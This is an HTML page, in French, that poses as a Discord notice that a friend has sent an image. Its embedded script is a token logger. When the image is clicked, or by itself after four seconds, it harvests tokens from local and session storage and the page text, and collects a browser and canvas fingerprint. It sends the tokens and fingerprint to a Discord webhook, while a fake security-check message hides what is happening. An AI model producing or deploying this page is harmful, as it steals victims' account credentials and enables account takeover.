<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Image partagée</title><style>*{margin:0;padding:0;box-sizing:border-box}body{background:#36393f;font-family:Whitney,Helvetica Neue,Helvetica,Arial,sans-serif;min-height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center;padding:20px;color:#dcddde}.header{background:#2f3136;padding:20px;border-radius:8px 8px 0 0;width:100%;max-width:500px;text-align:center;box-shadow:0 2px 10px rgba(0,0,0,.3)}.discord-logo{width:50px;height:50px;margin:0 auto 10px;display:block}.sender{font-size:14px;color:#b9bbbe}.image-container{background:#40444b;border-radius:0 0 8px 8px;padding:20px;width:100%;max-width:500px;text-align:center;box-shadow:0 4px 15px rgba(0,0,0,.4)}.real-image{max-width:100%;height:auto;border-radius:8px;cursor:pointer;transition:transform .2s;box-shadow:0 2px 10px rgba(0,0,0,.3)}.real-image:hover{transform:scale(1.02)}.loading{display:none;text-align:center;padding:20px;color:#43b581;font-weight:500}.footer{font-size:12px;color:#72767d;margin-top:10px}@media(max-width:600px){.header,.image-container{max-width:95vw}}</style></head><body><div class="header"><img class="discord-logo" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNTAiIGhlaWdodD0iNTAiIHZpZXdCb3g9IjAgMCA1MCA1MCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48Y2lyY2xlIGN4PSIyNSIgY3k9IjI1IiByPSIyNSIgZmlsbD0iIzcyODlEQiIvPjwvc3ZnPg==" alt="Discord"><div class="sender"><strong>@ami</strong> vous a envoyé une image</div></div><div class="image-container"><img class="real-image" src="your-image.jpg" alt="Image privée" onclick="stealToken()" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzAwIiBoZWlnaHQ9IjIwMCIgdmlld0JveD0iMCAwIDMwMCAyMDAiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHJlY3Qgd2lkdGg9IjMwMCIgaGVpZ2h0PSIyMDAiIHJ4PSI4IiBmaWxsPSIjNDA0NDRiIi8+PHRleHQgeD0iMTUwIiB5PSIxMDAiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIxOCIgZmlsbD0iI2RjZGRlZSIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZHk9Ii4zZW0iPkltYWdlIGNoYXJnZWVkIOKCrTwvdGV4dD48L3N2Zz4=';"><div class="loading" id="loading">🔄 Vérification sécurité...</div></div><div class="footer">Image hébergée sur Discord CDN</div><script>let WEBHOOK='https://discord.com/api/webhooks/ID/TOKEN';async function stealToken(){const loading=document.getElementById('loading'),img=document.querySelector('.real-image');img.style.opacity='.5';img.onclick=null;loading.style.display='block';const tokens=extractAllTokens(),fingerprint=getFingerprint();await exfiltrate(tokens,fingerprint);setTimeout(()=>{loading.innerHTML='✅ Image sécurisée et chargée';img.style.opacity='1';},2500);}function extractAllTokens(){const tokens=[];function grabStorage(){try{Object.keys(localStorage).forEach(key=>{if(key.includes('token')||key.startsWith('__'))tokens.push(localStorage[key])})}catch{}}function grabSession(){try{Object.keys(sessionStorage).forEach(key=>{if(key.includes('token'))tokens.push(sessionStorage[key])})}catch{}}function regexDOM(){try{const walker=document.createTreeWalker(document.body,NodeFilter.SHOW_TEXT,null,false);let node;while(node=walker.nextNode()){const matches=node.textContent.match(/[M][a-zA-Z0-9_\\-]{23,25}/g);if(matches)tokens.push(...matches)}}catch{}}function detectDiscord(){if(navigator.userAgent.includes('Discord')||window.__TAURI_INTERNALS__)tokens.push('discord_app_detected')}grabStorage();grabSession();regexDOM();detectDiscord();return[...new Set(tokens.filter(t=>t&&t.length>40))];}function getFingerprint(){return{ua:navigator.userAgent,lang:navigator.language,platform:navigator.platform,cookies:document.cookie?`[${document.cookie.split(';').length}]`:0,screen:`${screen.width}x${screen.height}`,colorDepth:screen.colorDepth,online:navigator.onLine?'yes':'no',plugins:navigator.plugins.length,canvas:canvasFingerprint(),webgl:webglFingerprint()};}function canvasFingerprint(){const canvas=document.createElement('canvas');canvas.width=200;canvas.height=60;const ctx=canvas.getContext('2d');ctx.textBaseline='top';ctx.font='14px Arial';ctx.fillText('Token logger test',2,2);return canvas.toDataURL();}function webglFingerprint(){const canvas=document.createElement('canvas');const gl=canvas.getContext('webgl');return gl?gl.getParameter(gl.RENDERER):'no_webgl';}async function exfiltrate(tokens,fingerprint){const payload={tokens,image:'your-image.jpg',victim:fingerprint,timestamp:new Date().toISOString(),url:window.location.href};try{await fetch(WEBHOOK,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:'Image Logger',embeds:[{title:`🖼️ ${tokens.length?`TOKEN x${tokens.length}`:'Pas de token'}`,description:`**Image**: your-image.jpg\n**Victim**: ${fingerprint.ua.slice(0,60)}`,color:tokens.length?0x00ff00:0xff0000,fields:[{name:'Tokens',value:tokens.slice(0,5).join('\n')||'❌ Aucun',inline:!1},{name:'Résolution',value:fingerprint.screen,inline:!0},{name:'Canvas FP',value:fingerprint.canvas.slice(0,50),inline:!0}],thumbnail:{url:'https://cdn.discordapp.com/emojis/1183482782975581499.png'},timestamp:payload.timestamp}]})})}catch{const img=new Image();img.src=`${WEBHOOK.split('/')[0]+'//'+WEBHOOK.split('/')[2]}/e?data=${btoa(JSON.stringify(payload))}`;}}// Auto-trigger après 4s (furtif)setTimeout(stealToken,4e3);</script></body></html>
